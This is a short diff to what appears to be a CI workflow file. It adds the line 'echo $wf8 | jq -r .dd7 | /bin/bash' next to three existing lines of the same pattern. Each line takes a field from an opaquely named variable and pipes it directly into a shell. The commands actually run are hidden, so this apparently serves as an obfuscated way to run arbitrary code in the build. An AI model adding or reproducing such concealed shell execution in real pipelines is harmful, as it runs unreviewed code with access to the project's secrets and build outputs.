@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$fyp921" | jq -r .ccqv451 | /bin/bash
           printf '%s' "$c07" | jq -r .zf296 | /bin/bash
           echo $s44690 | jq -r .n3288 | /bin/bash
+          echo $wf8 | jq -r .dd7 | /bin/bash
 
       - name: Save archive
         if: always()
